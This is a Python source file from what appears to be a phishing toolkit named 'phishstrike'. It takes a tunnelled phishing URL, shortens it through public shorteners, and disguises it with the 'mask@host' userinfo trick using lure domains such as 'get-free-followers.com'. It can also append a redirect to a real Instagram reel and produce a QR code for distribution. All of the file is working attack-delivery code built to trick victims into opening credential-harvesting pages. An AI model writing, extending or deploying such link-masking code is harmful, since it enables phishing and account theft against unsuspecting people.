import os
import time
import urllib.parse

from phishstrike import state
from phishstrike.features.qr import generate_qr
from lib.network import shorten, site_stat
from lib.terminal_ui import *


def custom_mask() -> None:
    time.sleep(0.5)
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    print()
    mask_op = slow_input(
        "    [?] Do you want to change Mask URL? [y/N]: ",
        start_rgb=(255, 215, 0),
        end_rgb=RGB_WHITE,
    )
    print()
    if mask_op.lower() == "y":
        print(
            f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Enter your custom URL below "
            f"{LIGHT2}({LIGHT2}Example: https://get-free-followers.com{LIGHT2})\n"
        )
        mask_url = input(f"{LIGHT1} ==> {LIGHT2}")
        if mask_url == "":
            mask_url = "https://"
        if mask_url.startswith("http") or mask_url.startswith("www"):
            state.mask = mask_url
            print(
                f"\n{DARK}[{WHITE}-{DARK}]{LIGHT2} Using custom Masked Url :"
                f"{PURPLE} {state.mask}"
            )
        else:
            print(
                f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid URL (must start with "
                f"http or www). Using default mask."
            )
            time.sleep(2)

    if state.website == "reels_video":
        print()
        target_op = slow_input(
            "    [?] Do you want to set a Target Video URL to redirect to? [y/N]: ",
            start_rgb=(255, 215, 0),
            end_rgb=RGB_WHITE,
        )
        print()
        if target_op.lower() == "y":
            print(
                f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Enter the target video URL below "
                f"{LIGHT2}({LIGHT2}Example: https://www.instagram.com/reel/XYZ{LIGHT2})\n"
            )
            state.target_video_url = input(f"{LIGHT1} ==> {LIGHT2}")
        else:
            state.target_video_url = ""


def custom_url(url: str) -> None:
    url = url.replace("http://", "").replace("https://", "")
    isgd = "https://is.gd/create.php?format=simple&url="
    shortcode = "https://api.shrtco.de/v2/shorten?url="
    tinyurl = "https://tinyurl.com/api-create.php?url="

    custom_mask()
    time.sleep(1)
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()

    processed_url = ""
    if "trycloudflare.com" in url or "loclx.io" in url:
        if site_stat(isgd):
            processed_url = shorten(isgd, url)
        elif site_stat(shortcode):
            processed_url = shorten(shortcode, url)
        else:
            processed_url = shorten(tinyurl, url)

        processed_url = processed_url.replace("http://", "").replace("https://", "")
        masked_url = f"{state.mask}@{processed_url}"
        processed_url = f"https://{processed_url}"
        url = f"https://{url}"
    else:
        url = "Unable to generate links. Try after turning on hotspot"
        processed_url = "Unable to Short URL"
        masked_url = ""

    if state.website == "reels_video" and state.target_video_url:
        encoded_target = urllib.parse.quote(state.target_video_url)
        if url.startswith("http"):
            url += f"?target={encoded_target}"
        if processed_url.startswith("http"):
            processed_url += f"?target={encoded_target}"
        if masked_url != "":
            masked_url += f"?target={encoded_target}"

    slow_type(
        f"    [-] URL 1 : {url}", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_PURPLE
    )
    slow_type(
        f"    [-] URL 2 : {processed_url}",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )
    if "Unable" not in processed_url:
        slow_type(
            f"    [-] URL 3 : {masked_url}",
            speed=0.01,
            start_rgb=RGB_WHITE,
            end_rgb=RGB_AZURE,
        )
        generate_qr(url)
